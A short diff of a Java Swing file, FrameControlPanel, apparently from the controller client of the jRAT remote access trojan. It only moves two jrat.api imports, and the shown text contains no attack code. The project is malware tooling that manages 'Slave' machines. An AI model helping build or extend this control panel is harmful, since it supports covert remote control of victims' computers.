@@ -31,6 +31,8 @@ import javax.swing.event.TreeSelectionListener;
 import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
 
+import jrat.api.BaseControlPanel;
+import jrat.api.RATControlMenuEntry;
 import su.jrat.client.Constants;
 import su.jrat.client.Script;
 import su.jrat.client.Slave;
@@ -83,8 +85,6 @@ import su.jrat.client.ui.renderers.ControlPanelRenderer;
 import su.jrat.client.utils.FlagUtils;
 import su.jrat.client.utils.IconUtils;
 import su.jrat.client.utils.Utils;
-import jrat.api.BaseControlPanel;
-import jrat.api.RATControlMenuEntry;
 
 @SuppressWarnings({ "serial" })
 public class FrameControlPanel extends BaseFrame {
